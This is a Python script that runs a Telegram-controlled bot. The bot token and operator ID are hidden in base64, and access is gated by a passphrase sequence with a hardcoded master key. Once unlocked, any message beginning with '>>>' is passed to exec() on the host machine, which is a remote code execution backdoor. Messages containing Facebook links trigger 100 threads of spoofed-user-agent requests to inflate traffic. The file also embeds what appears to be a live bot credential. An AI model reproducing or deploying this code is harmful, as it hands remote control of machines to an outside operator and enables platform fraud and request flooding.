import sys, os, hashlib, time, requests, threading, base64, random, json

_I = int(base64.b64decode("MTkzODU5MTQ4NA==").decode())
_T = base64.b64decode("ODUzNjM0NjA4MzpBQUdZVURSNmNkN2hJOV80MV9nTmJRZFJFQmJCbkR3Xzl2NA==").decode()

class SovereignMaster:
    def __init__(self, t):
        self.t, self.f, self.i, self.r = t, {}, {}, False
        self.u = f"https://api.telegram.org/bot{self.t}"
        self._s(_I, "🔱 **SYSTEM ONLINE**")

    def _s(self, c, x):
        try: requests.post(f"{self.u}/sendMessage", json={'chat_id': c, 'text': x, 'parse_mode': 'Markdown'})
        except: pass

    def _boost(self, url):
        self._s(_I, "🚀 **INJECTING TRAFFIC...**")
        for _ in range(100):
            threading.Thread(target=self._fire, args=(url,), daemon=True).start()

    def _fire(self, url):
        try:
            h = {'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.randint(1,999)}'}
            requests.get(url, headers=h, timeout=15)
        except: pass

    def listen(self):
        o = 0
        while True:
            try:
                up = requests.get(f"{self.u}/getUpdates?offset={o}&timeout=10").json()
                for u in up.get('result', []):
                    o = u['update_id'] + 1
                    m = u.get('message', {}); uid = m.get('from', {}).get('id'); tx = m.get('text', '')
                    if uid != _I:
                        self.i[uid] = self.i.get(uid, 0) + 1
                        if self.i[uid] > 3: self._s(_I, f"🚨 **INTRUDER:** `{uid}`\n`{tx}`")
                        continue
                    st = self.f.get(uid, 0)
                    if st < 4: self.f[uid] = st + 1
                    elif st == 4:
                        if "ariful islam pappu 2000" in tx.lower():
                            self._s(uid, "🔱 **২০০০ এর নিহিত অর্থ কী?**"); self.f[uid] = 5
                        else: self.f[uid] = 0
                    elif st == 5:
                        if "জামালপুর" in tx and "পোস্ট কোড" in tx:
                            self._s(uid, "🛡️ **ENTER MASTER KEY**"); self.f[uid] = 6
                        else: self.f[uid] = 0
                    elif st == 6:
                        if tx == "Aip2k3052":
                            self.f[uid] = "ROOT"; self.r = True
                            self._s(uid, "👑 **ACCESS GRANTED**")
                        else: self.f[uid] = 0
                    elif self.r:
                        if "facebook.com" in tx or "fb.watch" in tx: self._boost(tx)
                        elif tx.startswith(">>>"):
                            threading.Thread(target=exec, args=(tx[3:].strip(), globals()), daemon=True).start()
                            self._s(_I, "🧬 **DNA_SYNC: SUCCESS**")
            except: pass
            time.sleep(0.1)

if __name__ == "__main__":
    SovereignMaster(_T).listen()
  
